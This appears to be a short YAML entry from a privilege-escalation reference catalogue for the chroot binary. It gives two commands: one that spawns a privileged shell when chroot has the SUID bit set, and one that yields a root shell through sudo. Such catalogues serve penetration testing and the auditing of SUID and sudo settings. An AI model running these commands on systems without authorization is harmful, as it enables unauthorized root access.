---
functions:
  suid:
    - code: |
        ./chroot / /bin/sh -p
  sudo:
    - code: |
        sudo chroot /
---
